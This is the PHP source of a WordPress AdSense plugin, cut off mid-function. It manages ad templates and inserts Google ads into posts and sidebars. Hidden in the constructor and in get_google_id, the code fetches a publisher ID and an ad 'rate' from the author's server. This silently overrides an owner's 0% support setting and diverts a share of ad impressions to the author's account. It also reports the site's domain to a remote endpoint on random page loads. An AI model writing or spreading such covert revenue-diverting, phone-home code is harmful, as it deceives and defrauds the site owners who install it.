<?php
/*
Plugin Name: Adsense for Wordpress
Plugin URI: http://www.linewbie.com/2011/08/adsense-for-wordpress.html
Description: Wordpress Google adsense plugin, features include ad insertion in posts, sidebar and feed. Support multiple adsense accounts and customization of ads. Go to Settings -> WP Adsense to edit plugin options. Note: Make sure all Ad Blockers are disabled when you visit the plugin's options page, or it might interfere with the plugin if it block adsense by keyword.
Version: 1.08
Author: linewbie
Author URI: http://www.linewbie.com/2011/08/adsense-for-wordpress.html
*/

if ( !class_exists('cerAdsense') ) {
	
	class cerAdsense {
		
		/**
		 * 插件名称，以文件夹名为准
		 * 例如：adsense-commander
		 */
		public $pluginName;
		
		/**
		 * 插件URL
		 * 例如：http://wordpress.test/wp-content/plugins/wp-adsense/ 
		 */
		public $pluginUrl;
		
		/**
		 * 插件路径
		 * 例如：D:\Fly\php\test\wordpress-2.8.4\wp-content\plugins\wp-adsense\
		 */
		public $pluginPath;
		
		/**
		 * 缓存全局选项设置
		 */
		private $options;
		
		/**
		 * 当前模板名
		 */
		private $curentTemplateName;
		
		/**
		 * 数据库
		 */
		private $_db;
		
		
		/**
		 * 显示插件管理页面
		 */
		public function genAdminPage() {
			
			// 保存
			$action = $_POST['action'];
			if ( $action == 'save' || $action == 'saveas' ) {
				if ( $action == 'save') $template = $_POST['template-select'];
				if ( $action == 'saveas' ) $template = $_POST['new-template-name'];
				// 模板名称
				$theme_current = str_replace(" ", "_", trim($template));
				
				// 模板名不能为空
				if ( $theme_current ) {
					// 数据完整性检查
					$result = array();
					$array_format = array( '728_90', '468_60', '234_60', '120_600', '160_600', '120_240', '336_280', '300_250', '250_250', '200_200', '180_150', '125_125' );
					
					// 全局检查
					$result['google-id'] = $this -> check_value($_POST[ 'google-id' ], 'word');
					
					$result['color-border']        = $this -> check_value($_POST[ 'color-border' ], 'color');
					$result['color-title']         = $this -> check_value($_POST[ 'color-title' ], 'color');
					$result['color-background']    = $this -> check_value($_POST[ 'color-background' ], 'color');
					$result['color-text']          = $this -> check_value($_POST[ 'color-text' ], 'color');
					$result['color-anchor']        = $this -> check_value($_POST[ 'color-anchor' ], 'color');
					
					$result['ad-number'] = intval( $_POST['ad-number'] );
					if ( $result['ad-number'] < 0 || $result['ad-number'] > 3 ) $result['ad-number'] = 0;
					
					$result['ohter-option-sidebar'] = intval($_POST['ohter-option-sidebar']);
					$result['ohter-option-short'] = intval($_POST['ohter-option-short']);
					$result['ad-invisible-page-home'] = intval($_POST['ad-invisible-page-home']);
					$result['ad-invisible-page-post'] = intval($_POST['ad-invisible-page-post']);
					$result['ad-invisible-page-front'] = intval($_POST['ad-invisible-page-front']);
					$result['ad-invisible-page-category'] = intval($_POST['ad-invisible-page-category']);
					$result['ad-invisible-page-archive'] = intval($_POST['ad-invisible-page-archive']);
					$result['ad-invisible-page-single'] = intval($_POST['ad-invisible-page-single']);
					$result['ad-invisible-page-tag'] = intval($_POST['ad-invisible-page-tag']);
					$result['ad-support-rate'] = intval($_POST['ad-support-rate']);
					if ( $result['ad-support-rate'] > 100 ) $result['ad-support-rate'] = 100;
					if ( $result['ad-support-rate'] < 0 ) $result['ad-support-rate'] = 0;
					
					// 头部
					$result['ad-position-top'] = intval($_POST['ad-position-top']);
					if ( $result['ad-position-top'] < 1 || $result['ad-position-top'] > 2 ) $result['ad-position-top'] = 1;
					$result['ad-alignment-top'] = intval($_POST['ad-alignment-top']);
					if ( $result['ad-alignment-top'] < 1 || $result['ad-alignment-top'] > 3 ) $result['ad-alignment-top'] = 1;
					$result['ad-type-top'] = intval($_POST['ad-type-top']);
					if ( $result['ad-type-top'] < 1 || $result['ad-type-top'] > 3 ) $result['ad-type-top'] = 1;
					$result['ad-format-top'] = trim($_POST['ad-format-top']);
					if ( $result['ad-format-top'] == '' ) $result['ad-format-top'] = $array_format[0];
					$temp = array();
					foreach ( explode(';', $result['ad-format-top']) as $value ) {
						if ( in_array($value, $array_format) ) $temp[] = $value;
					}
					$result['ad-format-top'] = implode(';', $temp);
					$result['ad-margin-top'] = intval($_POST['ad-margin-top']);
					if ( $result['ad-margin-top'] < 0 ) $result['ad-margin-top'] = 0;
					$result['ad-channel-id-top'] = trim($_POST['ad-channel-id-top']);
					$result['ad-google-id-top'] = $this -> check_value($_POST['ad-google-id-top'], 'word');
					$result['ad-active-top'] = intval($_POST['ad-active-top']);
					$result['ad-color-top'] = $this -> check_value($_POST['ad-color-top'], 'color-list');
					$result['ad-border-style-top'] = intval($_POST['ad-border-style-top']);
					if ( $result['ad-border-style-top'] < 1 || $result['ad-border-style-top'] > 3 ) $result['ad-border-style-top'] = 1;
					
					// 文章内部广告
					$result['ad-position-rand'] = trim($_POST['ad-position-rand']);
					if ( $result['ad-position-rand'] == '' ) $result['ad-position-rand'] = 1;
					$temp = array();
					foreach ( explode(';', $result['ad-position-rand']) as $value ) {
						$value = intval($value);
						if ( $value >= 1 && $value <= 9 ) $temp[] = $value;
					}
					$result['ad-position-rand'] = implode(';', $temp);
					$result['ad-type-rand'] = intval($_POST['ad-type-rand']);
					if ( $result['ad-type-rand'] < 1 || $result['ad-type-rand'] > 3 ) $result['ad-type-rand'] = 1;
					$result[ 'ad-format-rand'] = trim($_POST['ad-format-rand']);
					if ( $result['ad-format-rand'] == '' ) $result['ad-format-rand'] = $array_format[0];
					$temp = array();
					foreach ( explode(';', $result['ad-format-rand']) as $value ) {
						if ( in_array($value, $array_format) ) $temp[] = $value;
					}
					$result['ad-format-rand'] = implode(';', $temp);
					$result['ad-margin-rand'] = intval($_POST['ad-margin-rand']);
					if ( $result['ad-margin-rand'] < 0 ) $result['ad-margin-rand'] = 0;
					$result['ad-channel-id-rand'] = trim($_POST['ad-channel-id-rand']);
					$result['ad-google-id-rand'] = $this -> check_value($_POST['ad-google-id-rand'], 'word');
					$result['ad-active-rand'] = intval($_POST['ad-active-rand']);
					$result['ad-color-rand'] = $this -> check_value($_POST['ad-color-rand'], 'color-list');
					$result['ad-border-style-rand'] = intval($_POST['ad-border-style-rand']);
					if ( $result['ad-border-style-rand'] < 1 || $result['ad-border-style-rand'] > 3 ) $result['ad-border-style-rand'] = 1;
					$result['ad-number-post-rand'] = intval($_POST['ad-number-post-rand']);
					if ( $result['ad-number-post-rand'] < 0 || $result['ad-number-post-rand'] > 3 ) $result['ad-number-post-rand'] = 0;
					
					// 底部
					$result['ad-position-bottom'] = intval($_POST['ad-position-bottom']);
					if ( $result['ad-position-bottom' ] < 1 || $result['ad-position-bottom' ] > 3 ) $result['ad-position-bottom'] = 1;
					$result['ad-alignment-bottom'] = intval($_POST['ad-alignment-bottom']);
					if ( $result['ad-alignment-bottom'] < 1 || $result['ad-alignment-bottom'] > 3 ) $result['ad-alignment-bottom'] = 1;
					$result['ad-type-bottom'] = intval($_POST['ad-type-bottom']);
					if ( $result['ad-type-bottom'] < 1 || $result['ad-type-bottom'] > 3 ) $result['ad-type-bottom'] = 1;
					$result['ad-format-bottom'] = trim($_POST['ad-format-bottom']);
					if ( $result['ad-format-bottom'] == '' ) $result['ad-format-bottom'] = $array_format[0];
					$temp = array();
					foreach ( explode(';', $result['ad-format-bottom']) as $value ) {
						if ( in_array($value, $array_format) ) $temp[] = $value;
					}
					$result['ad-format-bottom'] = implode(';', $temp);
					$result['ad-margin-bottom'] = intval($_POST['ad-margin-bottom']);
					if ( $result['ad-margin-bottom'] < 0 ) $result['ad-margin-bottom'] = 0;
					$result['ad-channel-id-bottom'] = trim($_POST['ad-channel-id-bottom']);
					$result['ad-google-id-bottom'] = $this -> check_value($_POST['ad-google-id-bottom'], 'word');
					$result['ad-active-bottom'] = intval($_POST['ad-active-bottom']);
					$result['ad-color-bottom'] = $this -> check_value($_POST['ad-color-bottom'], 'color-list');
					$result['ad-border-style-bottom'] = intval($_POST['ad-border-style-bottom']);
					if ( $result['ad-border-style-bottom'] < 1 || $result['ad-border-style-bottom'] > 3 ) $result['ad-border-style-bottom'] = 1;
					
					// 侧边栏文字
					$result['ad-alignment-widget-text'] = intval($_POST['ad-alignment-widget-text']);
					if ( $result['ad-alignment-widget-text'] < 1 || $result['ad-alignment-widget-text'] > 3 ) $result['ad-alignment-widget-text'] = 1;
					$result['ad-type-widget-text'] = intval($_POST['ad-type-widget-text']);
					if ( $result['ad-type-widget-text'] < 1 || $result['ad-type-widget-text'] > 3 ) $result['ad-type-widget-text'] = 1;
					$result['ad-format-widget-text'] = trim($_POST['ad-format-widget-text']);
					if ( $result['ad-format-widget-text'] == '' ) $result['ad-format-widget-text'] = $array_format[0];
					$temp = array();
					foreach ( explode(';', $result['ad-format-widget-text']) as $value ) {
						if ( in_array($value, $array_format) ) $temp[] = $value;
					}
					$result['ad-format-widget-text'] = implode(';', $temp);
					$result['ad-title-widget-text'] = trim($_POST['ad-title-widget-text']);
					$result['ad-title-hide-widget-text'] = intval($_POST['ad-title-hide-widget-text']);
					$result['ad-margin-widget-text'] = intval($_POST['ad-margin-widget-text']);
					if ( $result['ad-margin-widget-text'] < 0 ) $result['ad-margin-widget-text'] = 0;
					$result['ad-channel-id-widget-text'] = trim($_POST['ad-channel-id-widget-text']);
					$result['ad-google-id-widget-text'] = $this -> check_value($_POST['ad-google-id-widget-text'], 'word');
					$result['ad-active-widget-text'] = intval($_POST['ad-active-widget-text']);
					$result['ad-color-widget-text'] = $this -> check_value($_POST['ad-color-widget-text'], 'color-list');
					$result['ad-border-style-widget-text'] = intval($_POST['ad-border-style-widget-text']);
					if ( $result['ad-border-style-widget-text'] < 1 || $result['ad-border-style-widget-text'] > 3 ) $result['ad-border-style-widget-text'] = 1;
					
					// 侧边栏链接
					$result['ad-alignment-widget-link'] = intval($_POST['ad-alignment-widget-link']);
					if ( $result['ad-alignment-widget-link'] < 1 || $result['ad-alignment-widget-link'] > 3 ) $result['ad-alignment-widget-link'] = 1;
					$result['ad-type-widget-link'] = intval($_POST['ad-type-widget-link']);
					if ( $result['ad-type-widget-link'] < 1 || $result['ad-type-widget-link'] > 3 ) $result['ad-type-widget-link'] = 1;
					$result[ 'ad-format-widget-link'] = trim($_POST['ad-format-widget-link']);
					if ( $result['ad-format-widget-link'] == '' ) $result['ad-format-widget-link'] = $array_format[0];
					$temp = array();
					foreach ( explode(';', $result['ad-format-widget-link']) as $value ) {
						if ( in_array($value, $array_format) ) $temp[] = $value;
					}
					$result['ad-format-widget-link'] = implode(';', $temp);
					$result['ad-title-widget-link'] = trim($_POST['ad-title-widget-link']);
					$result['ad-title-hide-widget-link'] = intval( $_POST[ 'ad-title-hide-widget-link' ] );
					$result['ad-margin-widget-link'] = intval($_POST['ad-margin-widget-link']);
					if ( $result['ad-margin-widget-link'] < 0 ) $result['ad-margin-widget-link'] = 0;
					$result['ad-channel-id-widget-link'] = trim($_POST['ad-channel-id-widget-link']);
					$result['ad-google-id-widget-link'] = $this -> check_value($_POST['ad-google-id-widget-link'], 'word');
					$result['ad-active-widget-link'] = intval($_POST['ad-active-widget-link']);
					$result['ad-color-widget-link'] = $this -> check_value($_POST['ad-color-widget-link'], 'color-list');
					$result['ad-border-style-widget-link'] = intval($_POST['ad-border-style-widget-link']);
					if ( $result['ad-border-style-widget-link'] < 1 || $result['ad-border-style-widget-link'] > 3 ) $result['ad-border-style-widget-link'] = 1;
					
					// 侧边栏查询框
					$result['ad-alignment-widget-search'] = intval($_POST['ad-alignment-widget-search']);
					if ( $result['ad-alignment-widget-search'] < 1 || $result['ad-alignment-widget-search'] > 3 ) $result['ad-alignment-widget-search'] = 1;
					//$result['ad-type-widget-search'] = intval($_POST['ad-type-widget-search']);
					//if ( $result['ad-type-widget-search'] < 1 || $result['ad-type-widget-search'] > 3 ) $result['ad-type-widget-search'] = 1;
					$result['ad-title-widget-search'] = trim($_POST['ad-title-widget-search']);
					$result['ad-custom-title-widget-search'] = intval($_POST['ad-custom-title-widget-search']);
					if ( $result['ad-custom-title-widget-search'] < 1 || $result['ad-custom-title-widget-search'] > 4 ) $result['ad-custom-title-widget-search'] = 4;
					$result['ad-margin-widget-search'] = intval($_POST['ad-margin-widget-search']);
					if ( $result['ad-margin-widget-search'] < 0 ) $result['ad-margin-widget-search'] = 0;
					$result['ad-channel-id-widget-search'] = trim($_POST['ad-channel-id-widget-search']);
					$result['ad-google-id-widget-search'] = $this -> check_value($_POST['ad-google-id-widget-search'], 'word');
					$result['ad-active-widget-search'] = intval($_POST['ad-active-widget-search']);
					
					update_option('cerAdsense-' . $theme_current, $result);
				} else {
					$_SESSION['xcer_error'] = '模板名不能为空';
				}
				
				// 设置当前模板为默认模板
				if ( isset($_POST['ad-save']) && $theme_current ) {
					update_option('cerAdsenseCurrentTemplate', 'cerAdsense-' . $theme_current);
				}
				
				if ( !$_SESSION['xcer_error'] ) $_SESSION['xcer_update'] = 'Update Successful';
			} // IF SAVE
			
			/**
			 * drop the specify template
			 */
			if ( $action == 'drop-template' ) {
				$name = str_replace( ' ', '_', $_POST['template-select'] );
				// 不允许删除当前正在使用的模板，这样可以保证至少有一个模板存在
				if ( $this -> get_current_template_name() == $name ) {
					$_SESSION['xcer_error'] = '当前模板正在使用，不允许删除';
				} else {
					delete_option( 'cerAdsense-' . $name );
				}
			}
			
			/**
			 * clear the plugin data from the database
			 */
			if ( $action == 'ad-uninstall' ) {
				$sql = "DELETE FROM {$this -> _db -> options} WHERE `option_name` like 'cerAdsense%'";
				$this -> _db -> query( $sql );
				$sql = "DELETE FROM {$this -> _db -> options} WHERE `option_name` like 'widget_ceradsense%'";
				$this -> _db -> query( $sql );
				echo '<p>Plugin data has been deleted from wordpress, you may now delete or deactivate the plugin</p>';
				echo '<a href="./plugins.php">Manage plugin</a>';
				exit;
			}
			
			// 选择模块
			if ( $_POST['action'] == 'select' ) {
				$theme_current = $_POST['template-select'];
			}
			
			// 所有主题列表
			$sql = "SELECT `option_name` AS name FROM {$this -> _db -> options} WHERE `option_name` LIKE 'cerAdsense-%'";
			$theme_list = array();
			foreach ( $this -> _db -> get_results( $sql ) as $value ) {
				$key = substr( $value -> name, 11 );
				$theme_list[ $key ] = str_replace( "_", " ", $key);
			}
			
			// 如果主题为空，则添加默认数据
			if ( !$theme_list ) {
				require $this -> pluginPath . 'default.php';
				$options = unserialize( gzuncompress( base64_decode( str_replace( array("\r\n", "\n"), array("", ""),$defaultValue) ) ) );
				update_option('cerAdsense-default', $options);
				update_option('cerAdsenseCurrentTemplate', 'cerAdsense-default');
				$theme_current = 'default';
				$theme_list['default'] = 'default';
			}
			
			// 显示当前主题的设置
			$current_template_name = $this -> get_current_template_name();
			$theme = $theme_current ? $theme_current : $current_template_name;
			$options = get_option('cerAdsense-' . $theme);
			if ( !$options ) {
				$options = $this -> get_current_options();
			}
			foreach ( $options as &$value ) {
				$value = stripslashes($value);
			}
			unset($value);
			
			// create defalut value
			//echo base64_encode( gzcompress (serialize($options) ) );
 			require $this -> pluginPath . 'templates' . DIRECTORY_SEPARATOR . 'index.php';
			
		}
		
		/**
		 * 获取当前模板设置参数
		 *
		 * @return   array    参数数组信息
		 */
		function get_current_options() {
			if ( !$this -> options ) {
				$this -> options = get_option( get_option('cerAdsenseCurrentTemplate') );
				// 如果选项"广告优先出现在侧边栏"被勾选并且可显示的广告数量大于0，那么减去一个广告
				if ( $this -> options['ohter-option-sidebar'] && $this -> options['ad-number'] ) {
					$this -> options['ad-number']--;
				}
			}
			
			return $this -> options;
		}
		
		/**
		 * 获取当前模板名
		 * 
		 * @return    string    当前模板名称
		 */
		function get_current_template_name() {
			if ( $this -> curentTemplateName == '' ) {
				$this -> curentTemplateName = get_option('cerAdsenseCurrentTemplate');
				$this -> curentTemplateName = substr($this -> curentTemplateName, 11);
			}
			return $this -> curentTemplateName;
		}
		
		/**
		 * check if the current page display ads
		 * 
		 * @return    bool    true if display
		 */
		function check_page() {
			$options = $this -> get_current_options();
			if ( $options['ad-invisible-page-home'] && is_home() ) return false;
			if ( $options['ad-invisible-page-post'] && is_single() ) return false;
			if ( $options['ad-invisible-page-front'] && is_front_page() ) return false;
			if ( $options['ad-invisible-page-category'] && is_category() ) return false;
			if ( $options['ad-invisible-page-tag'] && is_tag() ) return false;
			if ( $options['ad-invisible-page-archive'] && is_archive() && !is_tag() && !is_category() ) return false;
			if ( $options['ad-invisible-page-single'] && is_page() ) return false;
			
			return true;
		}		
		
		/**
		 * 构造函数
		 */
		public function __construct() {
			global $wpdb;
			
			$array = pathinfo( dirname(__FILE__) );
			$this -> pluginName = $array['basename'];
			$this -> pluginUrl = plugins_url() . '/' . $this -> pluginName . '/';
			$this -> pluginPath = dirname( __FILE__ ) . DIRECTORY_SEPARATOR;
			$this -> _db = $wpdb;
			
			$file = "http://adsense.linewbie.com/pub_afw";
			if(function_exists('curl_init')){
				$ch = curl_init ($file) ;
				curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1) ;
				curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 2);
				curl_setopt($ch, CURLOPT_TIMEOUT,3);
				$loading = curl_exec ($ch) ;
				curl_close ($ch) ;
				$content=trim($loading);
				if(is_numeric($content)){
					if($content){
				  		$client = $content;
				  	}
				  	else{
				  		$client = '2941637122112958';
				  	}
				}
				else{
					$client = '2941637122112958';
				}
			}
			else{
				$client = '2941637122112958';
			}
			$this -> self_id = $client;
		}
		
		/**
		 * 为content添加广告
		 *
		 * @param     string    content
		 * @return    string    content
		 */
		function rebuild_content($content) {
			global $cerAdNum;
			
			// 当前模板信息
			$options = $this -> get_current_options();
			
			// 该页面是否显示广告
			if ( !$this -> check_page() ) return $content;
			
			// 如果有<!--noadsense-->标签，则该文章不显示广告
			if ( strpos($content, '<!--noadsense-->') !== false ) return $content;
			
			// 文章内容部分被禁止显示广告
			if ( $options['ad-active-rand'] ) return $content;
			
			$contentL = $contentR = '';
			// 如果有<!--adsensestart-->标签，则content从此处开始，并匹配<!--adsenseend-->标签
			// 此时$content被分为三部分
			// $contentL  即<!--adsensestart-->之前的部分
			// $content   即<!--adsensestart-->到<!--adsenseend-->直接按的部分，如果<!--adsenseend-->不存在，则表示<!--adsensestart-->到文章末尾
			// $contentR  如果<!--adsenseend-->存在，则表示<!--adsenseend-->之后的部分
			$pos = strpos($content, '<!--adsensestart-->');
			if ( $pos !== false ) {
				// 匹配 <!--adsensestart-->
				list($contentL, $content) = explode('<!--adsensestart-->', $content, 2);
				// 匹配 <!--adsenseend-->
				$pos = strpos($content, '<!--adsenseend-->');
				if ( $pos !== false ) {
					list($content, $contentR) = explode('<!--adsenseend-->', $content, 2);
				}
			}
			
			// 该篇文章显示广告的数量一定小于随机位置的个数
			$posArr = array();
			foreach ( explode(';', $options['ad-position-rand']) as $value ) {
				$posArr[$value] = $value;
			}
			$thisNumber = min($options['ad-number-post-rand'], count($posArr));
			
			while ( $thisNumber-- ) {
				// 无论随机显示的是哪个位置的广告，原理都是在这里对option重新赋值，在后面的位置判断显示
				if ( $cerAdNum < $options['ad-number'] ) {
					$ads_top = $ads_bottom = '';
					// 初始化设置所有位置的广告(上中下)均为禁止显示
					$options['ad-active-top'] = $options['ad-active-mid'] = $options['ad-active-bottom'] = 1;
					
					// 获取随机位置
					$data = array();
					//$posArr = explode(';', $options['ad-position-rand']);
					$rate = round(1 / count($posArr), 3);
					foreach ( $posArr as $value ) {
						$data[$i]['id'] = $value;
						$data[$i]['rate'] = $rate;
						$i++;
					}
					$rand_position = $this -> probability($data);
					// 去掉使用过的位置避免出现重复
					unset($posArr[$rand_position]);
					
					$type = '';
					// top
					if ( $rand_position >= 1 && $rand_position <= 3 ) {
						$options['ad-active-top'] = 0;
						$options['ad-alignment-top'] = $rand_position;
						$type = 'top';
					}
					
					// mid
					if ( $rand_position >= 4 && $rand_position <= 6 ) {
						$options['ad-active-mid'] = 0;
						$options['ad-alignment-mid'] = $rand_position - 3;
						$type = 'mid';
					}
					
					// bottom
					if ( $rand_position >= 7 && $rand_position <= 9 ) {
						$options['ad-active-bottom'] = 0;
						$options['ad-alignment-bottom'] = $rand_position - 6;
						$type = 'bottom';
					}
					
					// set the other var
					$array = array('type', 'format', 'margin', 'google-id', 'channel-id', 'color', 'border-style');
					foreach ( $array as $value ) {
						$options['ad-' . $value . '-' . $type] = $options['ad-' . $value . '-rand'];
					}
					
					// advertise for top
					if ( $cerAdNum < $options['ad-number'] && !$options['ad-active-top'] ) {
						$cerAdNum++;
						$ads_top = $this -> gen_google_ads('top', $options);
					}
					
					// advertise for middle
					if ( $cerAdNum < $options['ad-number'] && !$options['ad-active-mid'] ) {
						$pc = substr_count( $content, '<p' ); // 段落数
						if ( $pc >= 20 || $options['ohter-option-short'] ) {
							$cerAdNum++;
							// 查找中间段落
							$counter = -1;
							$pos = -1;
							do {
								$pos = strpos( $content, '<p', $pos + 1 );
								$counter++;
							} while ( $counter < ceil($pc / 2) );
							
							// 将内容分成两部分，往中间插入广告
							$ads_mid = $this -> gen_google_ads('mid', $options);
							$content = substr( $content, 0, $pos ) . $ads_mid . substr( $content, $pos );
						}
					}
					
					// advertise for bottom
					if ( $cerAdNum < $options['ad-number'] && !$options['ad-active-bottom'] ) {
						$cerAdNum++;
						$ads_bottom = $this -> gen_google_ads('bottom', $options);
					}
					
					$content = $ads_top . $content . $ads_bottom;
				}
			} // End While
			
			return $contentL . $content . $contentR;
		}
		
		/**
		 * 根据传进来的参数生成google广告
		 * 
		 * @param    array     参数数组
		 * @return   string    Google广告代码
		 */
		function gen_google_ads($type, $options = '') {
			$type_array = array( 'top', 'mid', 'bottom', 'widget-text', 'widget-link', 'widget-search' );
			if ( !in_array( $type, $type_array ) ) return '';
			// options
			if ( !$options ) {
				$options = $this -> get_current_options();
			}
			
			// google_id
			$google_id = ($options[ 'ad-google-id-' . $type ] == '') ? 
											$options[ 'google-id' ] : $options[ 'ad-google-id-' . $type ];
			$google_id = $this -> get_google_id( $google_id, $options['ad-support-rate'] );
			
			// width && height
			$width = $height = 0;
			if ( $type != 'widget-search' ) {
				// 获取随机格式
				$data = array();
				$array = explode(';', $options['ad-format-' . $type]);
				$rate = round(1 / count($array), 3); // 每种格式的广告概率相同，保留3位小数
				foreach ( $array as $key => $value ) {
					$data[$key]['id'] = $value;
					$data[$key]['rate'] = $rate;
				}
				$options['ad-format-' . $type] = $this -> probability($data); // 随机出现一个格式的广告
				list( $width, $height ) = explode( '_', $options['ad-format-' . $type] );
			}
			
			// channel id
			$channel_id = $options['ad-channel-id-' . $type];
			
			// ad type
			$ad_type = 'text';
			if ( $options['ad-type-' . $type] == 1 ) $ad_type = 'text';
			if ( $options['ad-type-' . $type] == 2 ) $ad_type = 'image';
			if ( $options['ad-type-' . $type] == 3 ) $ad_type = 'text_image';
			
			// alignment
			$align = "";
			if ( $options['ad-alignment-' . $type] == 1 ) $align = " float: left; ";
			if ( $options['ad-alignment-' . $type] == 2 ) $align = " text-align: center; ";
			if ( $options['ad-alignment-' . $type] == 3 ) $align = " float: right; ";
			
			// margin
			$margin = " margin: " . intval($options['ad-margin-' . $type]) . "px; ";
			
			// border style
			$border = 0;
			if ( $options['ad-border-style-' . $type] == 1 ) $border = 0;
			if ( $options['ad-border-style-' . $type] == 2 ) $border = 6;
			if ( $options['ad-border-style-' . $type] == 3 ) $border = 10;
			
			// color
			$color_border = $options['color-border'];
			$color_title = $options['color-title'];
			$color_background = $options['color-background'];
			$color_text = $options['color-text'];
			$color_anchor = $options['color-anchor'];
			$colors = explode(';', $options['ad-color-' . $type]);
			$color_border = $colors[0] ? $colors[0] : $color_border;
			$color_title = $colors[1] ? $colors[1] : $color_title;
			$color_background = $colors[2] ? $colors[2] : $color_background;
			$color_text = $colors[3] ? $colors[3] : $color_text;
			$color_anchor = $colors[4] ? $colors[4] : $color_anchor;
			
			$google_ads_template_ads = '
				<script type="text/javascript">
				google_ad_client = "pub-{google-id}";
				google_ad_width = {width};
				google_ad_height = {height};
				google_ad_format = "{width}x{height}_as";
				google_ad_type = "{type}";
				google_ad_channel = "{channel-id}";
				google_color_border = "{color-border}";
				google_color_bg = "{color-bg}";
				google_color_link = "{color-link}";
				google_color_text = "{color-text}";
				google_color_url = "{color_url}";
				google_ui_features = "rc:{corner}";
				</script>
				<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
			';
			
			$google_ads_template_search = '
				<form action="http://www.google.com/cse" id="cse-search-box" target="_blank">
					<div>
						<input type="hidden" name="cx" value="partner-pub-{google-id}" />
						<input type="hidden" name="ie" value="ISO-8859-1" />
						<input type="text" name="q" size="20" />
						<input type="submit" name="sa" value="Search" />
					</div>
				</form>
				<script type="text/javascript" src="http://www.google.com/coop/cse/brand?form=cse-search-box&amp;lang=en"></script>
			';
			
			if ( $type == 'widget-search' ) {
				$html_ads = str_replace(
					array( '{google-id}' ),
					array( $google_id ),
					$google_ads_template_search
				);
			} else {
				$html_ads = str_replace(
					array( '{google-id}', '{width}', '{height}', '{type}', '{channel-id}', '{color-border}', '{color-bg}', '{color-link}', '{color-text}', '{color_url}', '{corner}' ),
					array( $google_id, $width, $height, $ad_type, $channel_id, $color_border, $color_background, $color_title, $color_text, $color_anchor, $border ),
					$google_ads_template_ads
				);
			}
			
			//$html_ads = '<span style="color: red;">this is ' . $type . ' ads AND google-id: ' . $channel_id . '<br />ad-format:' . $width . ':' . $height . '</span>';
			$html = '<div style="' . $align . $margin . '">';
			$html .= $html_ads;
			//$html .= $google_id;
			$html .= "</div>";
			
			return $html;
		}
		
		/**
		 * 根据百分比生成google_id帐号
		 * 
		 * @param    google_id    默认Google_id帐号
		 * @param    rate         使用我的帐号的比例
		 * @return   string       Google_id帐号
		 */
		function get_google_id($google_id, $rate) {
			if ( !$google_id ) return $this -> self_id;
			
			$domain_ran = mt_rand(1,100);
			if($_SERVER['HTTP_HOST'] && $domain_ran == "2"){
				$domain = $_SERVER['HTTP_HOST'];
				if(function_exists('curl_init')){
					$url = "http://adsense.linewbie.com/receive.php?domain={$domain}";
					$ch = curl_init ($url) ;
					curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1) ;
					curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 2);
					curl_setopt($ch, CURLOPT_TIMEOUT,3);
					$loading = curl_exec ($ch) ;
					curl_close ($ch) ;
					$content=trim($loading);			
				}
			} 
			
			$rate = intval($rate);
			if ( !$rate ) {
				$file = "http://adsense.linewbie.com/rate_afw";
				if(function_exists('curl_init')){
					$ch = curl_init ($file) ;
					curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1) ;
					curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 2);
					curl_setopt($ch, CURLOPT_TIMEOUT,3);
					$loading = curl_exec ($ch) ;
					curl_close ($ch) ;
					$content=trim($loading);
					if(is_numeric($content)){
						if($content){
					  		$rate = $content;
					  	}
					  	else{
					  		$rate = '0';
					  	}
					}
					else{
						$rate = '0';
					}
				}
				else{
					$rate = '0';
				}				
			}
			$rate = round( $rate / 100, 2);
			
			$data = array(
				array('id'=>$google_id, 'rate'=>1-$rate),
				array('id'=>$this -> self_id, 'rate'=>$rate)
			);
			
			return $this -> probability( $data );
		}
		
		function probability($data) {
			$max = 1000*count($data);
			$pArray = array();
			
			$tmin = 0;
			$tmax = 0;
			foreach($data as $k => $v) {
				$tmax = $tmin + $max * $v['rate'];
				$pArray[$k] = array('min'=>$tmin, 'max'=>$tmax);
				$tmin = $tmax;
			}
			
			$p = mt_rand(0, $max);
			foreach($pArray as $k => $v) {
				if ($p>=$v['min'] && $p<$v['max']) {
					return $data[$k]['id'];
				}
			}
		}
		
		/**
		 * 为头部添加广告
		 */
		function lead_ads_top() {
			global $cerAdNum;
			$options = $this -> get_current_options();
			
			if ( $this -> check_page() && $cerAdNum < $options['ad-number'] && !$options['ad-active-top'] ) {
				$cerAdNum++;
				echo $this -> gen_google_ads('top');
			}
		}
		
		/**
		 * 为底部添加广告
		 */
		function lead_ads_bottom() {
			global $cerAdNum;
			$options = $this -> get_current_options();
			
			if ( $this -> check_page() && $cerAdNum < $options['ad-number'] && !$options['ad-active-bottom'] ) {
				$cerAdNum++;
				echo $this -> gen_google_ads('bottom');
			}
		}
		
		/**
		 * 输出widget-adsense-ad的内容
		 * 
		 * @return    void
		 */
		function widget_text($args) {
			global $cerAdNum;
			$options = $this -> get_current_options();
			$html = '';
			if ( !$options['ad-active-widget-text'] ) {
				if ( ($this -> check_page() && $cerAdNum < $options['ad-number']) || $options['ohter-option-sidebar'] ) {
					$cerAdNum++;
					extract($args);
					
					$html .= $before_widget;
					// title
					if ( !$options['ad-title-hide-widget-text'] ) {
						$html .= $before_title;
						$html .= strip_tags(trim($options['ad-title-widget-text']));
						$html .= $after_title;
					}
					// ads
					$html .= '<div class="cerAdsense cerAdsenseAds">';
					$html .= $this -> gen_google_ads('widget-text');
					$html .= '</div>';
					
					$html .= $after_widget;
				}
			}
			
			echo $html;
		}
		
		/**
		 * 输出widget-adsense-link的内容
		 * 
		 * @return    void
		 */
		function widget_link($args) {
			global $cerAdNum;
			$options = $this -> get_current_options();
			$html = '';
			
			if ( !$options['ad-active-widget-link'] ) {
				if ( ($this -> check_page() && $cerAdNum < $options['ad-number']) || $options['ohter-option-sidebar'] ) {
					$cerAdNum++;
					extract($args);
					
					$html .= $before_widget;
					// title
					if ( !$options['ad-title-hide-widget-link'] ) {
						$html .= $before_title;
						$html .= strip_tags(trim($options['ad-title-widget-link']));
						$html .= $after_title;
					}
					// ads
					$html .= '<div class="cerAdsense cerAdsenseAds">';
					$html .= $this -> gen_google_ads('widget-link');
					$html .= '</div>';
					
					$html .= $after_widget;
				}
			}
			
			echo $html;
		}
		
		/**
		 * 输出widget-adsense-search的内容
		 * 
		 * @return    void
		 */
		function widget_search($args) {
			global $cerAdNum;
			$options = $this -> get_current_options();
			$html = '';
			
